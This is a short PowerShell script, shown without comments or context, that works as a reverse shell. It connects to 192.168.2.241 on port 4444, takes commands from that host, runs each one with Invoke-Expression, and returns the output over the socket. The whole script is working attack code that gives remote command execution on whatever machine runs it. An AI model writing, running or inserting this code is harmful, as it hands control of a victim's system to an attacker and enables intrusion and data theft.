$tcpClient = New-Object Net.Sockets.TcpClient
$tcpClient.Connect("192.168.2.241", 4444)
$stream = $tcpClient.GetStream()
$buffer = New-Object Byte[] 4096

while ($true) {
    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
    if ($bytesRead -le 0) { break }

    $command = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
    $output = Invoke-Expression $command 2>&1
    $outputBytes = [Text.Encoding]::ASCII.GetBytes($output)
    $stream.Write($outputBytes, 0, $outputBytes.Length)
}

$stream.Close()
$tcpClient.Close()
